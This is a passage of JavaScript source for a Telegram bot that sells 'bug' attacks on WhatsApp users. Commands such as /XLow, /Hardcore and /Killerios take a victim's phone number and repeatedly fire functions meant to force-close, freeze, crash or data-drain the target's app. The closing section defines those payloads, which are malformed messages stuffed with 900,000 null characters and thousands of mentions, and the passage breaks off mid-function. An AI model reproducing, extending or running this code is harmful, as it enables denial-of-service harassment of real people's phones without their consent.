⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : ${progressStages[i]}

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [[
              { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
            ]]
          }
        }
      );
    }

    // 🚀 Eksekusi bug
    for (let i = 0; i < 150; i++) {
      await ZhTSuck(sock, target);
      await ZhTFlowers(sock, target);
      await sleep(1800);
    }

    // ✅ Status Success
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      undefined, ` <blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Draining Kuota hard 
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /Buldozer
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : SUCCESS ✅

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );
  }
);

bot.command("XLow",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 ☇ Format: /XLow 62×××`);

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const progressStages = [
      "▱▱▱▱▱▱▱▱ 0%",
      "▰▰▰▱▱▱▱▱ 30%",
      "▰▰▰▰▱▱▱▱ 50%",
      "▰▰▰▰▰▰▱▱ 70%",
      "▰▰▰▰▰▰▰▰ 100%"
    ];

    const sentMessage = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      thumbnailUrl,
      {
        caption: `<blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : ForceClose Whatsapp Click
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /XLow
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : ${progressStages[0]}

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>
`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );

    const msgId = sentMessage.message_id;

    // 🔄 Progress loading
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(400);
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msgId,
        undefined,
        `<blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : ForceClose Whatsapp Click
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /XLow
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : ${progressStages[i]}

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [[
              { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
            ]]
          }
        }
      );
    }

    // 🚀 Eksekusi bug
    for (let i = 0; i < 10; i++) {
      await ZxD(target);
      await sleep(1200);
    }

    // ✅ Status Success
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      undefined, ` <blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : ForceClose Whatsapp Click
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /XLow
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : SUCCESS ✅

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );
  }
);

bot.command("Hardcore",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 ☇ Format: /Hardcore 62×××`);

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const progressStages = [
      "▱▱▱▱▱▱▱▱ 0%",
      "▰▰▰▱▱▱▱▱ 30%",
      "▰▰▰▰▱▱▱▱ 50%",
      "▰▰▰▰▰▰▱▱ 70%",
      "▰▰▰▰▰▰▰▰ 100%"
    ];

    const sentMessage = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      thumbnailUrl,
      {
        caption: `<blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Invisible Delay hard
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /Hardcore
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : ${progressStages[0]}

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>
`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );

    const msgId = sentMessage.message_id;

    // 🔄 Progress loading
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(400);
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msgId,
        undefined,
        `<blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Invisible Delay hard
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /Hardcore
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : ${progressStages[i]}

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [[
              { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
            ]]
          }
        }
      );
    }

    // 🚀 Eksekusi bug
    for (let i = 0; i < 80; i++) {
      await HardCore(sock, target);
      await ZhTDemon(sock, target);
      await sleep(1200);
    }

    // ✅ Status Success
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      undefined, ` <blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Invisible Delay hard
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /Hardcore
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : SUCCESS ✅

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );
  }
);

bot.command("Clover",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 ☇ Format: /Clover 62×××`);

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const progressStages = [
      "▱▱▱▱▱▱▱▱ 0%",
      "▰▰▰▱▱▱▱▱ 30%",
      "▰▰▰▰▱▱▱▱ 50%",
      "▰▰▰▰▰▰▱▱ 70%",
      "▰▰▰▰▰▰▰▰ 100%"
    ];

    const sentMessage = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      thumbnailUrl,
      {
        caption: `<blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Delay invisible Infinity 
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /Clover
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : ${progressStages[0]}

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>
`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );

    const msgId = sentMessage.message_id;

    // 🔄 Progress loading
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(400);
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msgId,
        undefined,
        `<blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Delay invisible Infinity 
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /Clover
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : ${progressStages[i]}

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [[
              { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
            ]]
          }
        }
      );
    }

    // 🚀 Eksekusi bug
    for (let i = 0; i < 80; i++) {
      await R9X(sock, target, mention);
      await sleep(1200);
    }

    // ✅ Status Success
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      undefined, ` <blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Delay invisible Infinity 
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /Clover
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : SUCCESS ✅ 

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );
  }
);

bot.command("Flowerdly",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 ☇ Format: /Flowerdly 62×××`);

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const progressStages = [
      "▱▱▱▱▱▱▱▱ 0%",
      "▰▰▰▱▱▱▱▱ 30%",
      "▰▰▰▰▱▱▱▱ 50%",
      "▰▰▰▰▰▰▱▱ 70%",
      "▰▰▰▰▰▰▰▰ 100%"
    ];

    const sentMessage = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      thumbnailUrl,
      {
        caption: `<blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Crash Home Whatsapp 
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /Flowerdly
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : ${progressStages[0]}

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>
`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );

    const msgId = sentMessage.message_id;

    // 🔄 Progress loading
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(400);
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msgId,
        undefined,
        `<blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Crash Home Whatsapp 
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /Flowerdly
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : ${progressStages[i]}

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [[
              { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
            ]]
          }
        }
      );
    }

    // 🚀 Eksekusi bug
    for (let i = 0; i < 5; i++) {
      await amountOne(target);
      await R9X(sock, target, true);
      await sleep(1200);
    }

    // ✅ Status Success
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      undefined, ` <blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Crash Home Whatsapp 
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /Flowerdly
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : SUCCESS ✅

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );
  }
);

bot.command("BlankChat",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 ☇ Format: /BlankChat 62×××`);

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const progressStages = [
      "▱▱▱▱▱▱▱▱ 0%",
      "▰▰▰▱▱▱▱▱ 30%",
      "▰▰▰▰▱▱▱▱ 50%",
      "▰▰▰▰▰▰▱▱ 70%",
      "▰▰▰▰▰▰▰▰ 100%"
    ];

    const sentMessage = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      thumbnailUrl,
      {
        caption: `<blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Blank Click WhatsApp 
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /BlankChat
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : ${progressStages[0]}

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>
`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );

    const msgId = sentMessage.message_id;

    // 🔄 Progress loading
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(400);
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msgId,
        undefined,
        `<blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Blank Click WhatsApp 
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /BlankChat
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : ${progressStages[i]}

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [[
              { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
            ]]
          }
        }
      );
    }

    // 🚀 Eksekusi bug
    for (let i = 0; i < 60; i++) {
      await ZhTVlood(sock, target);
      await sleep(1500);
    }

    // ✅ Status Success
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      undefined, ` <blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Blank Click WhatsApp  
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /BlankChat
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : SUCCESS ✅

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );
  }
);

bot.command("Killerios",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 ☇ Format: /Killerios 62×××`);

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const progressStages = [
      "▱▱▱▱▱▱▱▱ 0%",
      "▰▰▰▱▱▱▱▱ 30%",
      "▰▰▰▰▱▱▱▱ 50%",
      "▰▰▰▰▰▰▱▱ 70%",
      "▰▰▰▰▰▰▰▰ 100%"
    ];

    const sentMessage = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      thumbnailUrl,
      {
        caption: `<blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Invisible Crash iPhone 
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /Killerios
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : ${progressStages[0]}

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>
`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );

    const msgId = sentMessage.message_id;

    // 🔄 Progress loading
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(400);
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msgId,
        undefined,
        `<blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Invisible Crash iPhone 
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /Killerios
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : ${progressStages[i]}

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [[
              { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
            ]]
          }
        }
      );
    }

    // 🚀 Eksekusi bug
    for (let i = 0; i < 80; i++) {
      await HyperSixty(target, mention);
      await sleep(1500);
    }

    // ✅ Status Success
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      undefined, ` <blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Invisible Crash iPhone 
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /Killerios
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : SUCCESS ✅

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );
  }
);

//-------------- CASE BEBAS SPAM ------------//
bot.command("GlowCrash", async (ctx) => {

  // ===== FILTER PREMIUM =====
  if (!isPremiumUser(ctx.from.id)) {
    return ctx.reply("❌ Command ini khusus USER PREMIUM.");
  }

  addJob(ctx, async () => {

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("❌ Format /GlowCrash 62xxxx");

    const target = q.replace(/\D/g, "") + "@s.whatsapp.net";

    await ctx.reply("🚀 Job dijalankan (ForceClose)...");

    // ===== PEMANGGILAN FUNCTION KAMU =====
    await ZhTForceVoice(sock, target);

    await ctx.reply("✅ Job selesai.");
  });
});

bot.command("Clover", async (ctx) => {

  // ===== FILTER PREMIUM =====
  if (!isPremiumUser(ctx.from.id)) {
    return ctx.reply("❌ Command ini khusus USER PREMIUM.");
  }

  addJob(ctx, async () => {

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("❌ Format /Clover 62xxxx");

    const target = q.replace(/\D/g, "") + "@s.whatsapp.net";

    await ctx.reply("🚀 Job dijalankan (Delay)...");

    // ===== PEMANGGILAN FUNCTION KAMU =====
    await TrueNull(sock, target);

    await ctx.reply("✅ Job selesai.");
  });
});
//TEST FUNCTION CUY//
bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 5 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 500))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote><pre>⬡═―—⊱ ⎧ BASE SCRIPT ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><pre>⬡═―—⊱ ⎧ BASE SCRIPT ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

// FUNCTION BUG//
async function ZhTFlowers(sock, target) {
    while (true) {
        var ZhT = {
            ephemeralMessage: {
                viewOncemessage: {
                    interactiveResponseMessage: {
                        contextInfo: {
                            mentionedJid: Array.from({ length: 3000 }, (_, r) => `62859${r + 1}@s.whatsapp.net`)
                        },
                        body: {
                            text: "ZhT - Flowers",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: `{"flow_cta":"${"\u0000".repeat(900000)}"}}`,
                            version: 3
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, ZhT, {
            messageId: null,
            participant: { jid: target },
            userJid: target,
        });
    }
}

async function ZhTSuck(sock, target) {
    var ZhT = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "ZhT",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(900000),
                        version: 3
                    }
                }
            }
        }
    };

    await sock.relayMessage("status@broadcast", {
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ 
                    tag: "to", 
                    attrs: { 
                        jid: target 
                    } 
                }]
            }]
        }]
    });
}

async function HyperSixty(target, mention) {
  try {
    const Node = "𑇂𑆵𑆴𑆿";
